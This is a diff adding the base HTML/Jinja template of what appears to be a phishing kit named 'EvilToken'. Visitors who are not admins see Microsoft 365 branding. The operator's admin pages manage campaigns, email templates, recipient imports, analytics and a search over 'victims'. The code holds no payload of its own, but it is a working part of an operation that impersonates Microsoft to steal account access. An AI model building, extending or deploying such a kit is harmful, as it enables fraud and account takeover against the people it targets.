@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{% block title %}{% if is_admin %}EvilToken Enterprise{% else %}Microsoft 365{% endif %}{% endblock %}</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link rel="stylesheet" href="/static/css/style.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script>
+        // Dark mode – only for admin pages (persistent)
+        document.addEventListener('DOMContentLoaded', function() {
+            const theme = localStorage.getItem('theme') || 'light';
+            document.documentElement.setAttribute('data-theme', theme);
+            const toggle = document.getElementById('themeToggle');
+            if (toggle) toggle.textContent = theme === 'dark' ? '☀️ Light' : '🌙 Dark';
+            {% if is_admin %}
+                fetchNotifications();
+                fetchActivities();
+                setInterval(fetchNotifications, 10000);
+                setInterval(fetchActivities, 15000);
+                const avatar = document.getElementById('userAvatar');
+                if (avatar) {
+                    avatar.addEventListener('click', function(e) {
+                        e.stopPropagation();
+                        document.getElementById('userDropdown').classList.toggle('show');
+                    });
+                }
+                document.addEventListener('click', function() {
+                    document.getElementById('userDropdown').classList.remove('show');
+                });
+            {% endif %}
+        });
+        function toggleTheme() {
+            const html = document.documentElement;
+            const current = html.getAttribute('data-theme');
+            const next = current === 'dark' ? 'light' : 'dark';
+            html.setAttribute('data-theme', next);
+            localStorage.setItem('theme', next);
+            const toggle = document.getElementById('themeToggle');
+            if (toggle) toggle.textContent = next === 'dark' ? '☀️ Light' : '🌙 Dark';
+        }
+        function toggleActivityPanel() {
+            document.getElementById('activityPanel').classList.toggle('open');
+        }
+        function fetchNotifications() {
+            fetch('/api/notifications')
+                .then(r => r.json())
+                .then(data => {
+                    const count = data.length || 0;
+                    const badge = document.getElementById('notifBadge');
+                    if (badge) badge.textContent = count > 0 ? count : '';
+                })
+                .catch(() => {});
+        }
+        function fetchActivities() {
+            fetch('/api/activities')
+                .then(r => r.json())
+                .then(data => {
+                    const container = document.getElementById('activityList');
+                    if (!container) return;
+                    container.innerHTML = data.map(a => `
+                        <div class="activity-item">
+                            <strong>${a.event_type.replace(/_/g, ' ').toUpperCase()}</strong>
+                            <span>${a.message}</span>
+                            <span class="time">${a.created_at ? new Date(a.created_at).toLocaleString() : ''}</span>
+                        </div>
+                    `).join('');
+                })
+                .catch(() => {});
+        }
+        function performSearch(e) {
+            if (e.key === 'Enter') {
+                const query = e.target.value.trim();
+                if (query) {
+                    window.location.href = '/campaigns?q=' + encodeURIComponent(query);
+                }
+            }
+        }
+        function closeFlash(el) {
+            const card = el.closest('.glass');
+            if (card) {
+                card.style.transition = 'opacity 0.5s';
+                card.style.opacity = '0';
+                setTimeout(() => card.remove(), 500);
+            }
+        }
+    </script>
+    {% block extra_head %}{% endblock %}
+</head>
+<body>
+    <!-- Admin Sidebar (only for admin pages) -->
+    {% if is_admin %}
+    <div class="sidebar">
+        <div class="logo">
+            <i class="fas fa-skull" style="color: #4cc9f0;"></i>
+            <span>Evil<span>Token</span></span>
+        </div>
+        <nav>
+            <a href="/admin" class="{% if request.path == '/admin' %}active{% endif %}">
+                <i class="fas fa-tachometer-alt"></i> Dashboard
+            </a>
+            <a href="/campaigns" class="{% if '/campaigns' in request.path %}active{% endif %}">
+                <i class="fas fa-bullhorn"></i> Campaigns
+            </a>
+            <a href="/templates" class="{% if '/templates' in request.path %}active{% endif %}">
+                <i class="fas fa-envelope"></i> Templates
+            </a>
+            <a href="/recipients" class="{% if '/recipients' in request.path %}active{% endif %}">
+                <i class="fas fa-users"></i> Recipients
+            </a>
+            <a href="/analytics" class="{% if '/analytics' in request.path %}active{% endif %}">
+                <i class="fas fa-chart-pie"></i> Analytics
+            </a>
+            <a href="/reports" class="{% if '/reports' in request.path %}active{% endif %}">
+                <i class="fas fa-file-alt"></i> Reports
+            </a>
+            <a href="/audit" class="{% if '/audit' in request.path %}active{% endif %}">
+                <i class="fas fa-clipboard-list"></i> Audit Logs
+            </a>
+            <a href="/integrations" class="{% if '/integrations' in request.path %}active{% endif %}">
+                <i class="fas fa-plug"></i> Integrations
+            </a>
+            <a href="/users" class="{% if '/users' in request.path %}active{% endif %}">
+                <i class="fas fa-user-shield"></i> Users & Roles
+            </a>
+            <a href="/settings" class="{% if '/settings' in request.path %}active{% endif %}">
+                <i class="fas fa-cog"></i> Settings
+            </a>
+        
+            <a href="/logout" class="logout-btn" style="margin-top: 20px; color: #f44336; border-top: 1px solid var(--border); padding-top: 15px; display: flex; align-items: center; gap: 10px; text-decoration: none; font-weight: 500;">
+                <i class="fas fa-sign-out-alt"></i> Logout
+            </a>
+
+        </nav>
+        <div class="quick-actions">
+            <div class="label">Quick Actions</div>
+            <a href="/create_campaign"><i class="fas fa-plus-circle"></i> New Campaign</a>
+            <a href="/templates/create"><i class="fas fa-plus"></i> New Template</a>
+            <a href="/import_csv"><i class="fas fa-file-import"></i> Import CSV</a>
+        </div>
+        <div class="bottom">
+            <span><i class="fas fa-shield-alt"></i> v3.0 • Enterprise</span>
+            <button id="themeToggle" class="theme-toggle" onclick="toggleTheme()">🌙 Dark</button>
+        </div>
+    </div>
+    {% else %}
+    <!-- Simple header for landing page -->
+    <div style="text-align: center; padding: 16px 0; background: var(--bg); border-bottom: 1px solid var(--border);">
+        <h1 style="font-size: 22px; font-weight: 600; color: var(--text-primary); margin: 0;">
+            <span style="font-weight: 700;">Microsoft</span>
+            <span style="color: var(--text-muted);">365</span>
+        </h1>
+    </div>
+    {% endif %}
+
+    <!-- Main Content -->
+    <div class="main {% if not is_admin %}no-sidebar{% endif %}">
+        <!-- Top Bar (only for admin pages) -->
+        {% if is_admin %}
+        <div class="topbar">
+            <div class="page-title">{% block page_title %}Dashboard{% endblock %}</div>
+            <div class="search-wrapper">
+                <i class="fas fa-search"></i>
+                <input type="text" id="globalSearch" placeholder="Search campaigns, victims..." onkeyup="performSearch(event)">
+            </div>
+            <div class="right">
+                <button class="icon-btn" onclick="toggleActivityPanel()" title="Activity">
+                    <i class="fas fa-clock"></i>
+                </button>
+                <button class="icon-btn" onclick="toggleActivityPanel()" title="Notifications">
+                    <i class="fas fa-bell"></i>
+                    <span class="badge-dot" id="notifBadge"></span>
+                </button>
+                <button id="themeToggle" class="icon-btn" onclick="toggleTheme()" title="Toggle Theme">
+                    <i class="fas fa-moon"></i>
+                </button>
+                <div class="user-dropdown">
+                    <div class="avatar" id="userAvatar" style="cursor:pointer;">A</div>
+                    <div class="dropdown-menu" id="userDropdown">
+                        <a href="#"><i class="fas fa-user"></i> Profile</a>
+                        <a href="/settings"><i class="fas fa-cog"></i> Settings</a>
+                        <div class="divider"></div>
+                        <a href="/logout" style="color: #f44336; font-weight: 600;"><i class="fas fa-sign-out-alt"></i> Logout</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        {% endif %}
+
+        <!-- Flash Messages with close button -->
+        {% with messages = get_flashed_messages(with_categories=true) %}
+          {% if messages %}
+            {% for category, message in messages %}
+              <div class="glass" style="background: {% if category == 'success' %}rgba(46,204,113,0.1); border-left: 4px solid var(--success);{% elif category == 'danger' %}rgba(231,76,60,0.1); border-left: 4px solid var(--danger);{% else %}rgba(0,0,0,0.05); border-left: 4px solid var(--text-muted);{% endif %} margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center;">
+                <p style="margin:0;">{{ message }}</p>
+                <button onclick="closeFlash(this)" style="background:transparent; border:none; font-size:18px; color:var(--text-muted); cursor:pointer;">&times;</button>
+              </div>
+            {% endfor %}
+          {% endif %}
+        {% endwith %}
+
+        {% block content %}{% endblock %}
+    </div>
+
+    <!-- Activity Panel (only for admin pages) -->
+    {% if is_admin %}
+    <div class="activity-panel" id="activityPanel">
+        <div class="header">
+            <h3><i class="fas fa-bell"></i> Notifications & Activity</h3>
+            <button class="close-btn" onclick="toggleActivityPanel()">&times;</button>
+        </div>
+        <div id="activityList">
+            <div class="activity-item">Loading...</div>
+        </div>
+    </div>
+    {% endif %}
+
+    <script>
+        // No auto-close – flash messages stay until user clicks X
+    </script>
+</body>
+</html>
